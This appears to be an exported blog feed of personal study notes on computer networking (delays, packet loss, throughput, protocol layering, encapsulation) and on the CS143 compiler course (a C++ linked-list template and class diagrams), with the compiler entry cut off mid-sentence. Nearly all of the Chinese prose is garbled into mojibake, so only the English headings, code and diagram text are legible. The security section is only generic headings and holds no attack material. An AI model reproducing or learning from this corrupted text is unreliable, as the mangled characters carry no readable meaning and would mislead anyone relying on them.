æ˜¯æŒ‡<strong>æ¯”ç‰¹è¿›å…¥é“¾è·¯åï¼Œä»è¯¥é“¾è·¯çš„èµ·ç‚¹åˆ°ä¸‹ä¸€ä¸ªç»“ç‚¹æ‰€ç”¨çš„æ—¶é—´</strong>ï¼›ä¸€æ—¦åˆ†ç»„ä¸­çš„æœ€åä¸€ä¸ªæ¯”ç‰¹åˆ°è¾¾è·¯ç”±å™¨å°±æ„å‘³ç€è¯¥åˆ†ç»„çš„æ‰€æœ‰æ¯”ç‰¹éƒ½å·²åˆ°è¾¾è·¯ç”±å™¨ï¼›å¹¿åŸŸç½‘ä¸­ï¼Œä¼ æ’­æ—¶å»¶ä¸€èˆ¬æ˜¯æ¯«ç§’çº§çš„ã€‚<strong>ä¼ æ’­æ—¶å»¶æ˜¯d/s</strong>ã€‚dæ˜¯è·¯ç”±å™¨Aåˆ°Bçš„è·ç¦»ã€‚sæ˜¯é“¾è·¯çš„ä¼ æ’­é€Ÿç‡ã€‚</li></ul></li><li>ä¼ è¾“æ—¶å»¶å’Œä¼ æ’­æ—¶å»¶çš„å¯¹æ¯”ï¼š<ul><li>ä¼ è¾“æ—¶å»¶ï¼šå¤§å¡è½¦ç»è¿‡æ”¶è´¹ç«™çš„æ—¶é—´ï¼ˆåˆ†ç»„é•¿åº¦L <strong>/</strong> é“¾è·¯çš„ä¼ è¾“é€Ÿç‡ï¼‰</li><li>ä¼ æ’­æ—¶å»¶ï¼šå¤§å¡è½¦åœ¨é«˜é€Ÿä¸Šè¡Œé©¶çš„æ—¶é—´ï¼ˆä¸¤å°è·¯ç”±å™¨ä¹‹é—´çš„é“¾è·¯é•¿åº¦d <strong>/</strong> ä¸¤å°è·¯ç”±å™¨ä¹‹é—´çš„ä¼ è¾“é€Ÿç‡ï¼‰</li></ul></li></ul><h4 id="æ’é˜Ÿæ—¶å»¶å’Œä¸¢åŒ…ï¼š"><a href="#æ’é˜Ÿæ—¶å»¶å’Œä¸¢åŒ…ï¼š" class="headerlink" title="æ’é˜Ÿæ—¶å»¶å’Œä¸¢åŒ…ï¼š"></a>æ’é˜Ÿæ—¶å»¶å’Œä¸¢åŒ…ï¼š</h4><ul><li>ä¸¢åŒ…Packet Lossï¼šåˆ°è¾¾çš„åˆ†ç»„å‘ç°ä¸€ä¸ªæ»¡çš„é˜Ÿåˆ—ã€‚ç”±äºæ²¡æœ‰åœ°æ–¹å­˜å‚¨è¿™ä¸ªåˆ†ç»„ï¼Œè·¯ç”±å™¨å°†ä¸¢å¼ƒè¯¥åˆ†ç»„ï¼Œè¯¥åˆ†ç»„å°†ä¼šä¸¢å¤±ã€‚<ul><li>æ’é˜Ÿæ—¶å»¶å’Œä¸¢åŒ…ä¸ç½‘ç»œçš„çŠ¶å†µå’Œç»“ç‚¹çš„ç¼“å†²ç©ºé—´å¤§å°ã€å¤„ç†é€Ÿåº¦ç›¸å…³ï¼›</li><li>å¦‚æœåˆ†ç»„åˆ°è¾¾çš„é€Ÿåº¦ <strong>&gt;</strong> ç»“ç‚¹çš„å¤„ç†é€Ÿåº¦ï¼Œé‚£ä¹ˆåˆ†ç»„å°±ä¼šåœ¨ç¼“å†²é˜Ÿåˆ—é‡Œæ’é˜Ÿç­‰å¾…ã€‚</li><li>ä¸ºäº†æè¿°ç½‘ç»œçŠ¶æ€ï¼Œæˆ‘ä»¬å¼•å…¥äº†<strong>æµé‡å¼ºåº¦traffic intensity</strong>è¿™ä¸€æ¦‚å¿µï¼š<strong>æµé‡å¼ºåº¦=åˆ†ç»„åˆ°è¾¾çš„é€Ÿåº¦ / ç»“ç‚¹çš„å¤„ç†é€Ÿåº¦</strong>ï¼›</li><li>æµé‡å·¥ç¨‹é‡Œä¸€ä¸ªé‡‘ç§‘ç‰å¾‹å°±æ˜¯ï¼šè®¾è®¡ç³»ç»Ÿæ—¶<strong>æµé‡å¼ºåº¦&lt;=1</strong>ï¼Œæµé‡å¼ºåº¦æŒç»­å¤§äº1æ—¶ï¼Œå°±å°†å‡ºç°<strong>ä¸¢åŒ…</strong>ç°è±¡</li></ul></li></ul><h4 id="ç«¯åˆ°ç«¯æ—¶å»¶ï¼š"><a href="#ç«¯åˆ°ç«¯æ—¶å»¶ï¼š" class="headerlink" title="ç«¯åˆ°ç«¯æ—¶å»¶ï¼š"></a>ç«¯åˆ°ç«¯æ—¶å»¶ï¼š</h4><ul><li><strong>ç«¯åˆ°ç«¯æ—¶å»¶ ==(èŠ‚ç‚¹æ€»æ—¶å»¶ * (è·¯ç”±å™¨ä¸ªæ•°+1) )== ï¼ˆç»“ç‚¹å¤„ç†æ—¶å»¶+æ’é˜Ÿæ—¶å»¶+ä¼ è¾“æ—¶å»¶+ä¼ æ’­æ—¶å»¶ï¼‰*ï¼ˆè·¯ç”±å™¨ä¸ªæ•°+1ï¼‰</strong></li></ul><h4 id="è®¡ç®—æœºç½‘ç»œçš„ååé‡ï¼š"><a href="#è®¡ç®—æœºç½‘ç»œçš„ååé‡ï¼š" class="headerlink" title="è®¡ç®—æœºç½‘ç»œçš„ååé‡ï¼š"></a>è®¡ç®—æœºç½‘ç»œçš„ååé‡ï¼š</h4><ul><li>è®¡ç®—æœºç½‘ç»œçš„ååé‡å®é™…ä¸Šæ˜¯ä¸€ä¸ªé€Ÿåº¦æŒ‡æ ‡ï¼Œå®ƒæè¿°äº†<strong>æ¯”ç‰¹ç»è¿‡æŸä¸ªèŠ‚ç‚¹çš„é€Ÿåº¦</strong> </li><li><strong>æŸèŠ‚ç‚¹çš„ååé‡ == min(å‘é€æ•°æ®çš„é€Ÿåº¦ï¼Œæ¥æ”¶æ•°æ®çš„é€Ÿåº¦)</strong> </li><li><strong>ä»»ä½•æ—¶é—´çš„ç¬æ—¶ååé‡ï¼š</strong> æ˜¯ä¸»æœº<strong>æ¥å—</strong>åˆ°è¯¥æ–‡ä»¶çš„é€Ÿç‡</li><li><strong>å¹³å‡ååé‡ï¼š</strong> è¯¥åˆ†ç»„çš„Læ¯”ç‰¹ <strong>/</strong> ä¸»æœºæ¥æ”¶è¯¥åˆ†ç»„æ‰€æœ‰çš„æ¯”ç‰¹ç”¨å»çš„æ—¶é—´T</li><li>ååé‡å¯ä»¥è¿‘ä¼¼ä¸ºæºå’Œç›®çš„åœ°ä¹‹é—´è·¯å¾„çš„æœ€å°ä¼ è¾“é€Ÿç‡ã€‚<strong>æœ€å°ä¼ è¾“é€Ÿç‡çš„é“¾è·¯ä¸ºç“¶é¢ˆé“¾è·¯</strong>ã€‚</li><li>åœ¨ä»Šå¤©ï¼Œ<strong>å› ç‰¹ç½‘å¯¹ååç‡çš„é™åˆ¶å› ç´ é€šå¸¸æ˜¯æ¥å…¥ç½‘</strong>ã€‚</li></ul><h3 id="åè®®å±‚æ¬¡åŠå…¶æœåŠ¡æ¨¡å‹ï¼š"><a href="#åè®®å±‚æ¬¡åŠå…¶æœåŠ¡æ¨¡å‹ï¼š" class="headerlink" title="åè®®å±‚æ¬¡åŠå…¶æœåŠ¡æ¨¡å‹ï¼š"></a>åè®®å±‚æ¬¡åŠå…¶æœåŠ¡æ¨¡å‹ï¼š</h3><ul><li>å› ç‰¹ç½‘æ˜¯ä¸€ä¸ªæä¸ºå¤æ‚çš„ç³»ç»Ÿï¼Œè¯¥ç³»ç»Ÿé‡Œå­˜åœ¨ç€å¤§é‡çš„åº”ç”¨ç¨‹åºå’Œåè®®ã€å„ç§ç±»å‹çš„ç«¯ç³»ç»Ÿã€åˆ†ç»„äº¤æ¢æœºå’Œå„ç§ç±»å‹çš„é“¾è·¯çº§åª’ä½“ã€‚ä½†æ˜¯å®ƒåŒæ—¶ä¹Ÿæ˜¯æœ‰ç€æ¸…æ™°ç»“æ„çš„ï¼Œå°±åƒæˆ‘ä»¬å‰é¢åœ¨ç½‘ç»œæ ¸å¿ƒ ä¸€èŠ‚ä»‹ç»çš„ï¼Œæˆ‘ä»¬ä»èƒ½æ„å»ºå®ƒçš„ç»“æ„æ¨¡å‹</li></ul><h4 id="åˆ†å±‚ä½“ç³»ç»“æ„"><a href="#åˆ†å±‚ä½“ç³»ç»“æ„" class="headerlink" title="åˆ†å±‚ä½“ç³»ç»“æ„"></a>åˆ†å±‚ä½“ç³»ç»“æ„</h4><ul><li>ä¼˜ç‚¹ï¼š<ul><li>æ˜“äºæœåŠ¡å®ç°çš„å¤šæ ·æ€§,å› ä¸ºæŸä¸€å±‚å¯¹å…¶ä¸Šä¸€å±‚æä¾›æœåŠ¡ï¼ŒåŒæ—¶å®ƒå¯ä»¥åˆ©ç”¨ä¸‹ä¸€å±‚æä¾›çš„æœåŠ¡ï¼Œåªè¦å¯¹ä¸Šæä¾›çš„æœåŠ¡å’Œå¯¹ä¸‹åˆ©ç”¨çš„æœåŠ¡æ²¡æœ‰å˜åŒ–ï¼Œå…¶å±‚å†…éƒ¨çš„å®ç°å¹¶ä¸ä¼šå¯¹ç³»ç»Ÿç»“æ„äº§ç”Ÿå½±å“ï¼Œä¹Ÿå°±æ˜¯å¯¹äºå¤§è€Œå¤æ‚ä¸”éœ€è¦ä¸æ–­æ›´æ–°çš„ç³»ç»Ÿæ¥è¯´ æ”¹å˜æœåŠ¡çš„å®ç°è€Œä¸ä¼šå½±å“ç³»ç»Ÿå…¶ä»–ç»„ä»¶ã€‚ </li><li>ä¸ç”¨å…³æ³¨ä¸‹ä¸€å±‚å¦‚ä½•å®ç°ï¼Œä»¥åŠå¤„ç†æ•…éšœçš„ç»†èŠ‚ã€‚</li><li>åè®®åˆ†å±‚å…·æœ‰<strong>æ¦‚å¿µåŒ–å’Œç»“æ„åŒ–</strong>ï¼š<strong>ä½¿å¾—æ¨¡å—åŒ–ä½¿æ›´æ–°ç³»ç»Ÿç»„ä»¶æ›´ä¸ºå®¹æ˜“</strong>ã€‚</li></ul></li><li>ç¼ºç‚¹ï¼š<ul><li><strong>åŠŸèƒ½ä¸Šçš„å†—ä½™ï¼Œ</strong> æ¯”å¦‚è®¸å¤šåè®®æ ˆé’ˆå¯¹é“¾è·¯å’Œç«¯åˆ°ç«¯ä¸¤ç§æƒ…å†µéƒ½æä¾›äº†<strong>å·®é”™æ¢å¤åŠŸèƒ½</strong></li><li><strong>æŸå±‚çš„åŠŸèƒ½å¯èƒ½éœ€è¦ä»…åœ¨å…¶å®ƒå±‚æ‰èƒ½å‡ºç°çš„ä¿¡æ¯ï¼Œè¿™è¿åäº†å±‚æ¬¡åˆ†ç¦»çš„ç›®æ ‡</strong></li></ul></li><li>æ€»ä½“æ¥è¯´ï¼Œå°†å„å±‚çš„æ‰€æœ‰åè®®ç»„åˆèµ·æ¥ï¼Œç§°ä¸ºåè®®æ ˆã€‚å› ç‰¹ç½‘çš„åè®®æ ˆæœ‰5ä¸ªå±‚æ¬¡ç»„æˆï¼šç‰©ç†å±‚ã€é“¾è·¯å±‚ã€ç½‘ç»œæˆã€ä¼ è¾“å±‚ã€åº”ç”¨å±‚ã€‚<ul><li><strong>åº”ç”¨å±‚ï¼š</strong> åº”ç”¨å±‚åè®®åˆ†å¸ƒåœ¨<strong>å¤šä¸ªç«¯ç³»ç»Ÿ</strong>ï¼Œç«¯ç³»ç»Ÿä¸­çš„<strong>åº”ç”¨ç¨‹åºä½¿ç”¨è¯¥åè®®ä¸å¦ä¸€ä¸ªç«¯ç³»ç»Ÿä¸­çš„åº”ç”¨ç¨‹åº</strong>é€šä¿¡ã€‚å¤„äºåº”ç”¨å±‚çš„<strong>åˆ†ç»„</strong>ç§°ä¸º<strong>æŠ¥æ–‡ã€‚</strong></li><li><strong>ä¼ è¾“å±‚ï¼š</strong> ä¼ è¾“å±‚åœ¨åº”ç”¨ç¨‹åº<strong>ç«¯ç‚¹</strong>ä¹‹é—´ä¼ è¾“åº”ç”¨å±‚æŠ¥æ–‡ï¼Œå› ç‰¹ç½‘ä¸­æœ‰ä¸¤ä¸ªä¼ è¾“å±‚åè®®ï¼š==TCPå’ŒUDP==ã€‚å¤„äºä¼ è¾“å±‚çš„åˆ†ç»„ç§°ä¸º<strong>æŠ¥æ–‡æ®µ</strong>ã€‚TCPæä¾›ç¡®ä¿ä¼ é€’ã€æµé‡æ§åˆ¶ã€æ‹¥å¡æ§åˆ¶æœºåˆ¶ã€‚UDPæä¾›<strong>æ— è¿æ¥</strong>æœåŠ¡ï¼Œå³<strong>ä¸æä¾›ä¸å¿…è¦æœåŠ¡çš„æœåŠ¡</strong>, æ²¡æœ‰å¯é æ€§ã€æ²¡æœ‰æµé‡å’Œæ‹¥å¡æ§åˆ¶ã€‚</li><li><strong>ç½‘ç»œå±‚ï¼š</strong> ç½‘ç»œå±‚å°†ç§°ä¸º<strong>æ•°æ®æŠ¥</strong>çš„ç½‘ç»œå±‚åˆ†ç»„<strong>ä»ä¸€å°ä¸»æœºç§»åŠ¨åˆ°å¦ä¸€å°ä¸»æœº</strong>ã€‚ç½‘ç»œå±‚åè®®åŒ…å«è‘—åçš„IPåè®®ä»¥åŠå…¶ä»–ä¸€äº›è·¯ç”±é€‰æ‹©åè®®ã€‚</li><li><strong>é“¾è·¯å±‚ï¼š</strong> é“¾è·¯å±‚å°†ç§°ä¸º<strong>å¸§</strong>çš„é“¾è·¯å±‚åˆ†ç»„<strong>ä»ä¸€ä¸ªç»“ç‚¹ç§»åŠ¨åˆ°è·¯å¾„ä¸Šçš„å¦ä¸€ä¸ªç»“ç‚¹</strong>ã€‚ä¸€ä¸ªå¸§å¯èƒ½è¢«æ²¿é€”ä¸åŒé“¾è·¯ä¸Šçš„ä¸åŒé“¾è·¯å±‚åè®®å¤„ç†ã€‚</li><li><strong>ç‰©ç†å±‚ï¼š</strong> ç‰©ç†å±‚çš„ä»»åŠ¡æ˜¯å°†<strong>å¸§ä¸­çš„æ¯”ç‰¹ä»ä¸€ä¸ªç»“ç‚¹ç§»åŠ¨åˆ° ä¸‹ä¸€ä¸ªèŠ‚ç‚¹</strong>ï¼Œå®ƒæä¾›äº†ä¼ è¾“ä¿¡æ¯çš„å®é™…ç‰©ç†é€šé“ï¼›</li></ul></li><li>OSIæ¨¡å‹ï¼š<ul><li>åœ¨<strong>å› ç‰¹ç½‘åè®®æ ˆ</strong>å‡ºç°ä»¥å‰ï¼Œ<strong>OSIæ¨¡å‹</strong>æ˜¯ISOï¼ˆå›½é™…æ ‡å‡†åŒ–ç»„ç»‡ï¼‰ç»„ç»‡ç ”å‘çš„è®¡ç®—æœºç½‘ç»œç»“æ„æ¨¡å‹ã€‚</li><li>OSIçš„æ¨¡å‹ä¸€å…±æœ‰7å±‚ï¼›</li><li>ä»ä¸‹åˆ°ä¸Šä¾æ¬¡ä¸ºï¼š<strong>ç‰©ç†å±‚ï¼Œé“¾è·¯å±‚ï¼Œç½‘ç»œå±‚ï¼Œä¼ è¾“å±‚ï¼Œä¼šè¯å±‚ï¼Œè¡¨ç¤ºå±‚ï¼Œåº”ç”¨å±‚</strong>ã€‚ç›¸æ¯”å› ç‰¹ç½‘ä½“ç³»ç»“æ„ï¼ŒOSIå¤šäº†ä¸¤å±‚ã€‚</li><li><strong>å› ç‰¹ç½‘</strong>å°†ä¸¤å±‚ <strong>ï¼ˆä¼šè¯å±‚ï¼Œè¡¨ç¤ºå±‚ï¼‰</strong> çš„åŠŸèƒ½ç•™ç»™äº†<strong>å¼€å‘è€…è‡ªè¡Œå®ç°</strong>ã€‚</li></ul></li></ul><h4 id="å°è£…ï¼š"><a href="#å°è£…ï¼š" class="headerlink" title="å°è£…ï¼š"></a>å°è£…ï¼š</h4><ul><li>ä¸€ä¸ªåˆ†ç»„ï¼Œåœ¨ä¸åŒçš„å±‚æ¬¡æœ‰ä¸åŒçš„ç§°è°“ï¼Œæ˜¯å› ä¸ºå®ƒä»¬<strong>ç»è¿‡æ¯ä¸€å±‚ï¼ˆè‡ªä¸Šè‡³ä¸‹ï¼‰çš„æ—¶å€™å°±è¢«è¯¥å±‚å°è£…ä¸Šäº†å±äºè¯¥å±‚çš„ç›¸å…³ä¿¡æ¯</strong>ï¼Œä¹Ÿå°±æ˜¯å‰é¢æåˆ°çš„ <strong>ï¼ˆåˆ†ç»„ä¸­çš„ï¼‰å¿…è¦ä¿¡æ¯</strong> ï¼›äºæ˜¯ï¼Œæ¯ä¸€åˆ†å±‚çš„åˆ†ç»„æœ‰<strong>ä¸¤ç§ç±»å‹çš„å­—æ®µ</strong>ï¼š<strong>é¦–éƒ¨å­—æ®µå’Œæœ‰æ•ˆè´Ÿè½½</strong>ï¼›å…¶ä¸­<strong>æœ‰æ•ˆè´Ÿè½½å³ä¸ºæ¥è‡ªä¸Šä¸€å±‚çš„åˆ†ç»„æ•°æ®</strong>ï¼Œè€Œ<strong>é¦–éƒ¨å­—æ®µå°±æ˜¯è¯¥å±‚åŠ ä¸Šçš„å¿…è¦ä¿¡æ¯</strong>ï¼›åˆ†ç»„<strong>ä¸æ–­è¢«å°è£…ï¼ˆä¹Ÿå°±æ˜¯ä¸æ–­åœ°åŠ é¦–éƒ¨å­—æ®µï¼Œä¹Ÿå°±æ˜¯å¿…è¦ä¿¡æ¯ï¼‰</strong> ä»¥å®ç°å„å±‚åè®®è§„å®šçš„ç›¸å…³åŠŸèƒ½ã€‚</li></ul><h3 id="Networks-Under-Attack"><a href="#Networks-Under-Attack" class="headerlink" title="Networks Under Attack"></a>Networks Under Attack</h3><ul><li>The Bad Guys Can Put Malware into Your Host Via the Internet</li><li>The Bad Guys Can Attack Servers and Network Infrastructure</li><li>The Bad Guys Can Sniff Packets</li><li>The Bad Guys Can Masquerade as Someone You Trust</li></ul><p>We should seek defenses against sniffing, end-point masquerading, man-in-the-middle attacks, DDoS attacks, malware, and more.</p><h2 id="ç¬¬äºŒç« -åº”ç”¨å±‚"><a href="#ç¬¬äºŒç« -åº”ç”¨å±‚" class="headerlink" title="ç¬¬äºŒç« :åº”ç”¨å±‚"></a>ç¬¬äºŒç« :åº”ç”¨å±‚</h2><blockquote><p>è¿˜æ˜¯è‡ªå·±åšæ€ç»´å¯¼å›¾å§, çœŸåƒä»¥å‰é‚£æ ·å­åšçš„è¯ç¬”è®°ä¼šè¯¦ç»†çš„è¿‡äºææ€–äº†.</p><p>ä¹¦ä¸Šæ˜¯ä»é›¶å¼€å§‹å¼•å¯¼å¼çš„, æ‰€ä»¥ä¼šæ¯”è¾ƒè¯¦ç»†.</p><p>(æˆ‘ç‰¹ä¹ˆçœŸèƒ½å†™, çœŸçš„å¥½å¤š, ä¸è¿‡å¤ä¹ èµ·æ¥ä¹ŸæŒºçˆ½çš„)</p></blockquote><p><img src="../../image/Computer_Networking/Computer_Networks.png" alt="Computer_Networks"></p><h2 id="ç¬¬ä¸‰ç« "><a href="#ç¬¬ä¸‰ç« " class="headerlink" title="ç¬¬ä¸‰ç« "></a>ç¬¬ä¸‰ç« </h2><p><img src="../../image/Computer_Networking/Chapter3.png" alt="Chapter3"></p><h2 id="ç¬¬å››ç« "><a href="#ç¬¬å››ç« " class="headerlink" title="ç¬¬å››ç« "></a>ç¬¬å››ç« </h2><p><img src="../../image/Computer_Networking/Chapter4.png" alt="Chapter4"></p><h2 id="ç¬¬äº”ç« "><a href="#ç¬¬äº”ç« " class="headerlink" title="ç¬¬äº”ç« "></a>ç¬¬äº”ç« </h2><p><img src="../../image/Computer_Networking/Chapter5.png" alt="Chapter5"></p><h2 id="ç¬¬å…­ç« "><a href="#ç¬¬å…­ç« " class="headerlink" title="ç¬¬å…­ç« "></a>ç¬¬å…­ç« </h2><p><img src="../../image/Computer_Networking/Chapter6.png" alt="Chapter6"></p><h2 id="ç¬¬ä¸ƒç« "><a href="#ç¬¬ä¸ƒç« " class="headerlink" title="ç¬¬ä¸ƒç« "></a>ç¬¬ä¸ƒç« </h2><p><img src="../../image/Computer_Networking/Chapter7.png" alt="Chapter7"></p><h2 id="ç¬¬å…«ç« "><a href="#ç¬¬å…«ç« " class="headerlink" title="ç¬¬å…«ç« "></a>ç¬¬å…«ç« </h2><p><img src="../../image/Computer_Networking/Chapter8.png" alt="Chapter8"></p>]]></content>
    
    
    <categories>
      
      <category>CS</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Network</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ç¼–è¯‘åŸç†complier</title>
    <link href="/2021-10/Archive-complier/"/>
    <url>/2021-10/Archive-complier/</url>
    
    <content type="html"><![CDATA[<h1 id="COMPLIER-CS143"><a href="#COMPLIER-CS143" class="headerlink" title="COMPLIER-CS143"></a>COMPLIER-CS143</h1><p>è¿™ç¯‡æ–‡ç« æ‰€ç”¨åˆ°çš„ä»£ç ç»“æ„å…¶å®å¤æ‚äº†ä¸€äº›, çœ‹åˆ°ä¸ªå…¶ä»–çš„è§£æ³•</p><h2 id="0-é¢„å¤‡çŸ¥è¯†"><a href="#0-é¢„å¤‡çŸ¥è¯†" class="headerlink" title="0. é¢„å¤‡çŸ¥è¯†"></a>0. é¢„å¤‡çŸ¥è¯†</h2><h3 id="COOLè¯­è¨€"><a href="#COOLè¯­è¨€" class="headerlink" title="COOLè¯­è¨€"></a>COOLè¯­è¨€</h3><ul><li>åªèƒ½è¯´æ˜¯æ¯”è¾ƒå¤æ‚, manualså’Œæºç åˆ†æè¯¦è§ç›¸å…³æ–‡æ¡£</li><li>æ¯”è¾ƒå…¸å‹çš„æ˜¯ç»§æ‰¿æ ‘ç»“æ„</li></ul><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++">          &#123; -&gt; [String]<br>          &#123; -&gt; [Int]<br>[OBJECT] =&#123; -&gt; [IO]     -&gt; [B]<br>          &#123; -&gt; [Bool]<br>          &#123; -&gt; [A]<br></code></pre></div></td></tr></table></figure><h3 id="ç¼–è¯‘åŸç†"><a href="#ç¼–è¯‘åŸç†" class="headerlink" title="ç¼–è¯‘åŸç†"></a>ç¼–è¯‘åŸç†</h3><ul><li>è¯æ³•åˆ†æ-&gt;è¯­æ³•åˆ†æ-&gt;è¯­ä¹‰åˆ†æ</li><li><img src="https://i.loli.net/2021/11/15/AlBoJu85kTGY1FX.png" alt="image-20211013100444035" style="zoom:67%;" /> </li><li><strong>è¯æ³•åˆ†æ</strong> <ul><li>ä»å·¦å‘å³é€è¡Œæ‰«ææºç¨‹åºçš„å­—ç¬¦ï¼Œè¯†åˆ«å‡ºå„ä¸ªå•è¯ï¼Œç¡®å®šå•è¯çš„ç±»å‹ã€‚å°†è¯†åˆ«å‡ºçš„å•è¯è½¬æ¢æˆç»Ÿä¸€çš„æœºå†…è¡¨ç¤ºâ€”â€”è¯æ³•å•å…ƒ(<strong>token</strong>)å½¢å¼</li></ul></li><li><strong>è¯­æ³•åˆ†æ</strong> <ul><li>è¯­æ³•åˆ†æå™¨(parser)ä»è¯æ³•åˆ†æå™¨è¾“å‡ºçš„tokenåºåˆ—ä¸­è¯†åˆ«å‡ºå„ç±»çŸ­è¯­ï¼Œå¹¶æ„é€ è¯­æ³•åˆ†ææ ‘(<strong>parse tree</strong>)</li></ul></li><li><strong>è¯­ä¹‰åˆ†æ</strong> <ul><li>æ”¶é›†æ ‡è¯†ç¬¦çš„å±æ€§ä¿¡æ¯&amp;&amp;è¯­ä¹‰æ£€æŸ¥</li></ul></li><li><strong>ä¸­é—´ä»£ç </strong> <ul><li>ä¸‰åœ°å€ç  (Three-address Code)<div class="hljs code-wrapper"><pre><code>ä¸‰åœ°å€ç ç”±ç±»ä¼¼äºæ±‡ç¼–è¯­è¨€çš„æŒ‡ä»¤åºåˆ—ç»„æˆï¼Œæ¯ä¸ªæŒ‡ä»¤æœ€å¤šæœ‰ä¸‰ä¸ªæ“ä½œæ•°(operand)</code></pre></div></li><li>è¯­æ³•ç»“æ„æ ‘/è¯­æ³•æ ‘ (Syntax Trees)</li></ul></li></ul><h3 id="CS143å®éªŒæ–‡ä»¶ç»“æ„"><a href="#CS143å®éªŒæ–‡ä»¶ç»“æ„" class="headerlink" title="CS143å®éªŒæ–‡ä»¶ç»“æ„"></a>CS143å®éªŒæ–‡ä»¶ç»“æ„</h3><h4 id="list-h"><a href="#list-h" class="headerlink" title="list.h:"></a>list.h:</h4><ul><li>æ³¨æ„åˆ°headæ˜¯è¿™ä¸ªèŠ‚ç‚¹å­˜å‚¨çš„æ•°æ®, è€ŒtailæŒ‡å‘ä¸‹ä¸€ä¸ªèŠ‚ç‚¹, æ„é€ èŠ‚ç‚¹æ—¶åœ¨è¿™ä¸€ä¸²é“¾è¡¨çš„å¤´éƒ¨æ·»åŠ æ–°çš„èŠ‚ç‚¹. </li></ul><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-keyword">template</span> &lt;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">T</span>&gt;</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">List</span> &#123;</span><br><span class="hljs-keyword">private</span>:<br>  T *head;<br>  List&lt;T&gt;* tail;<br><span class="hljs-keyword">public</span>:<br>  <span class="hljs-built_in">List</span>(T *h,List&lt;T&gt;* t = <span class="hljs-literal">NULL</span>): <span class="hljs-built_in">head</span>(h), <span class="hljs-built_in">tail</span>(t) &#123; &#125;<br><br>  <span class="hljs-function">T *<span class="hljs-title">hd</span><span class="hljs-params">()</span> <span class="hljs-keyword">const</span>       </span>&#123; <span class="hljs-keyword">return</span> head; &#125;  <br>  <span class="hljs-function">List&lt;T&gt;* <span class="hljs-title">tl</span><span class="hljs-params">()</span> <span class="hljs-keyword">const</span> </span>&#123; <span class="hljs-keyword">return</span> tail; &#125;<br>&#125;;<br></code></pre></div></td></tr></table></figure><h4 id="tree-h-cool-tree-h"><a href="#tree-h-cool-tree-h" class="headerlink" title="tree.h+cool-tree.h:"></a>tree.h+cool-tree.h:</h4><ul><li>All APS nodes are derived from tree_node.</li><li>Lists of APS objects are implemented by the â€œlist_nodeâ€ template.</li><li>Class_, Feature, Expressionç­‰ç­‰éƒ½æ˜¯æŒ‡å‘constructor(ç¬¬äºŒå±‚)çš„æŒ‡é’ˆ. å‰è€…æ˜¯å› ä¸ºClassæ˜¯c++å…³é”®å­—, æ‰€ä»¥åŠ ä¸Šä¸€ä¸ªä¸‹åˆ’çº¿.</li><li>å±å®å¾ˆæŠ½è±¡, æˆ‘è§‰å¾—ä¸‰å±‚ç»“æ„çš„åŸå› æ˜¯ä¸ºäº†æŠŠç¬¬äºŒå±‚ä½œæˆä¸€ä¸ªé€šç”¨class, å› ä¸ºå…¨æ˜¯**<u>çº¯è™š</u>**å‡½æ•°. å°±åƒFeatureé‚£æ ·. ç¡®å®æ˜¯è¿™æ ·, åœ¨æŠŠclass methodåŠ å…¥envçš„method_tableä¸­æ—¶åªè¦ç»™å‡ºFeaturesæŒ‡é’ˆ(<code>typedef Feature_class* Feature</code>)ç„¶åè°ƒç”¨feature_addå‡½æ•°å³å¯åˆ†é…åˆ°methodæˆ–è€…attrçš„addå‡½æ•°, æ•´äº†ä¸€ä¸ªå¤šæ€. </li></ul><pre><code class=" mermaid">classDiagramclass tree_node&#123;    int line_number       tree_node()    virtual tree_node *copy() = 0    virtual void dump(ostream&amp; stream, int n) = 0    int get_line_number()    tree_node *set(tree_node *)&#125;class list_node&#123;å®ç°äº†ä¸‰ä¸ªè¿”å›ä¸‹æ ‡çš„è¿­ä»£å™¨&#125;class nodeç›¸å…³&#123;append_nodenil_nodesingle_list_node&#125;tree_node --|&gt; list_nodelist_node --|&gt; nodeç›¸å…³class Class__class&#123;    virtual__get_name()    virtual__get_parent()    virtual__get_features()    virtual__get_filename()    virtual__dump_with_types(ostream&amp;,int)&#125;Class__class : define simple_phylum_Class_class class__class&#123;   Symbol name;   Symbol parent;   Features features;   Symbol filename;&#125;Class__class --|&gt; class__classtree_node --|&gt; Class__classtree_node --|&gt; Feature_classclass Feature_class&#123;å…¨ä¸ºçº¯è™šå‡½æ•°:dump_with_types(ostream&amp;,int) = 0Symbol get_name()tc(EnvironmentP)add_to_table(EnvironmentP)&#125;class method_class&#123;    Symbol name;    Formals formals;    Symbol return_type;    Expression expr;    get_return_type()    get_formals()    ...&#125;class attr_class&#123;   Symbol name;   Symbol type_decl;   Expression init;&#125;Feature_class --|&gt; method_classFeature_class --|&gt; attr_classtree_node --|&gt; Formal_classtree_node --|&gt; Case_classtree_node --|&gt; Expression_class</code></pre><h4 id="stringtable"><a href="#stringtable" class="headerlink" title="stringtable:"></a>stringtable:</h4><ul><li>Symbolæ˜¯æŒ‡å‘<strong>Entry</strong>çš„æŒ‡é’ˆ <code>typedef Entry* Symbol;</code> </li></ul><pre><code class=" mermaid">classDiagramdirection RLclass Entry&#123;  char *str;      int  len;     int index;&#125;Entry --|&gt; StringEntryEntry --|&gt; IntEntryEntry --|&gt; IdEntryclass StringTable~Elem~&#123;   List~Elem~ *tbl;   int index;&#125;StringTable .. Entry</code></pre><h2 id="1-lexer-è¯æ³•åˆ†æ"><a href="#1-lexer-è¯æ³•åˆ†æ" class="headerlink" title="1. lexer - è¯æ³•åˆ†æ"></a>1. lexer - è¯æ³•åˆ†æ</h2><ul><li>è¿™ä¸€å®éªŒçœ‹ä¸Šå»å°±æ˜¯é€å­—åˆ†æç„¶åæ 